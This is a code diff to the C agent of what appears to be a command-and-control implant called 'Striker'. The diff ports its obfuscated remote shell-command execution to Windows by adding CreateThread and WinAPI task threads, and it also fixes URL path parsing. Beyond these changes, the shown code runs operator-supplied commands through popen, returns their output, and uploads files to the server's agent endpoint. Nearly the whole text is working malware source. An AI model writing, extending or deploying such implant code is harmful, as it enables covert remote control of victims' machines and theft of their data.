@@ -79,6 +79,13 @@ void parse_url(char *url, URL_PROTO *proto, char *host, int *port, char *path){
     }
     if (url[i] == ':'){
       *port = atoi(url + i + 1);
+      while (i < strlen(url)){
+        if (url[i] == '/'){
+          strncpy(path, url + i, MAX_URL_PATH_LEN);
+          break;
+        }
+        i++;
+      }
       break;
     }
     host_len++;
@@ -219,7 +226,7 @@ int http_post(char *url, cJSON *data, buffer *body){
     HINTERNET hRequest = HttpOpenRequestA(hConnect, strs[2], urlPath, NULL, NULL, NULL, 0, 0);
     if (!HttpSendRequestA(hRequest, strs[0], strlen(strs[0]), postData, strlen(postData))){
       #ifdef STRIKER_DEBUG
-      fprintf(stderr, "[-] Error making POST request to: %s", target_url);
+      fprintf(stderr, "[-] Error making POST request to: %s\n", target_url);
       #endif
       goto end;
     }
@@ -585,8 +592,12 @@ void free_task(task *tsk){
   free(tsk);
 }
 
-void *task_executor(void *ptr){
-  
+#ifdef IS_LINUX
+void *task_executor(void *ptr)
+#else
+DWORD WINAPI task_executor(LPVOID ptr)
+#endif
+{
   #ifdef IS_LINUX
     pthread_detach(pthread_self());
   #endif
@@ -602,31 +613,27 @@ void *task_executor(void *ptr){
   for (int i = 0; i < 8; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
-    #ifdef IS_LINUX
-      char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
-      for (int i = 0; i < 2; i++)
-        obfs_decode(strs[i]);
-      char *cmd = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
-      if (!cmd)
-        goto complete;
-      char *shell_cmd = malloc(sizeof(char) * 1024);
-      snprintf(shell_cmd, sizeof(char) * 1024, strs[1], cmd);
-      FILE *proc = popen(shell_cmd, "r");
-      free(shell_cmd);
-      if (!proc)
-        goto complete;
-      const short chunk_size = 1024;
-      char *tmp = malloc(sizeof(char) * chunk_size);
-      while (result_buff->used < MAX_RES_SIZE){
-        if (fgets(tmp, chunk_size, proc) == NULL)
-          break;
-        append_buffer(result_buff, tmp, strlen(tmp));
-      }
-      free(tmp);
-      pclose(proc);
-    #else
-      buffer_strcpy(result_buff, "Coming soon on windows...");
-    #endif
+    char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
+    for (int i = 0; i < 2; i++)
+      obfs_decode(strs[i]);
+    char *cmd = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
+    if (!cmd)
+      goto complete;
+    char *shell_cmd = malloc(sizeof(char) * 1024);
+    snprintf(shell_cmd, sizeof(char) * 1024, strs[1], cmd);
+    FILE *proc = popen(shell_cmd, "r");
+    free(shell_cmd);
+    if (!proc)
+      goto complete;
+    const short chunk_size = 1024;
+    char *tmp = malloc(sizeof(char) * chunk_size);
+    while (result_buff->used < MAX_RES_SIZE){
+      if (fgets(tmp, chunk_size, proc) == NULL)
+        break;
+      append_buffer(result_buff, tmp, strlen(tmp));
+    }
+    free(tmp);
+    pclose(proc);
   }else if (!strcmp(tsk->type, cmd_strs[1])){ // Upload a file to the server.
     char strs[][40] = {"[OBFS_ENC]file", "[OBFS_ENC]Error opening file!", "[OBFS_ENC]%s/agent/upload/%s"};
     for (int i = 0; i < 3; i++)
@@ -717,7 +724,7 @@ void *task_executor(void *ptr){
     #ifdef IS_LINUX
       pthread_exit(NULL);
     #endif
-    return NULL;
+    return 0;
 }
 
 void start_session(){  
@@ -943,6 +950,17 @@ void start_session(){
           queue_remove(tasks_queue, tasks_queue->count - 1);
           free_task(tsk);
           free(tskw);
+        }
+      #else
+        DWORD threadID;
+        HANDLE tHandle = CreateThread(NULL, 0, task_executor, tskw, 0, &threadID);
+        if (!tHandle){
+          #ifdef STRIKER_DEBUG
+          fprintf(stderr, "[-] Error starting thread for task: %s\n", tsk->uid);
+          #endif
+          queue_remove(tasks_queue, tasks_queue->count - 1);
+          free_task(tsk);
+          free(tskw);          
         }
       #endif
       i--;
